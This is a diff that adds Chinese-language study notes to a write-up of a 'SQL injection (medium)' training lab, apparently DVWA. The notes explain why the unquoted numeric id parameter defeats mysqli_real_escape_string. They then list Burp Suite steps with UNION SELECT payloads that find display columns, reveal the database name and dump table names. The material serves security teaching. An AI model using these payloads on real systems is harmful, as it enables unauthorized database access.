@@ -1,3 +1,5 @@
+# sql injection(medium) :数字型注入
+
 # 目录源码/页面源码
 ```
 <?php
@@ -35,7 +37,19 @@ mysqli_close($GLOBALS["___mysqli_ston"]);
 
 
 
+# POST请求
+
+# `$id`外面没有单引号包裹,数字型注入
+
 # `$id = mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $id);`
+## `mysqli_real_escape_string()` :将单引号`'`、双引号`"`等特殊字符转义(加上反斜杠`\`)
 
 
+# burpsuite抓包改包
+# 1、找显示位(判断列数)
+## `-1 union select 1,2`(如果页面回显了1和2说明有2列)
+# 2、爆库名
+## `id=-1 union select 1,database()`
+# 3、爆表名
+## `id=-1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()`
 
